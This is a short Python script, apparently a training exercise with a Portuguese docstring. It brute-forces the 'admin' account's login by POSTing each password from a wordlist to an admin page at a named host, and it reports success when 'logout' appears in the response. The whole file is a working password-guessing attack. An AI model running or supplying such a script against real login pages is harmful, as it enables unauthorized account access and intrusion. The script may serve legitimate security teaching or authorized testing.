"""
Retorna o HTML da página pelo POST, verificando se há itens específicos nele para você escolher o retorno
desejado de acordo com o item encontrado.
"""

import requests

with open("wordlist.txt", "r") as file:
    wordlist = file.read().splitlines()

    for word in wordlist:
        data = {"user": "admin", "password": word}
        response = requests.post("http://advanced.bancocn.com/admin/index.php", data=data)
        if "logout" in response.text:
            print(f"Senha {word} Correta!")
        else:
            print(f"Senha {word} Incorreta!")
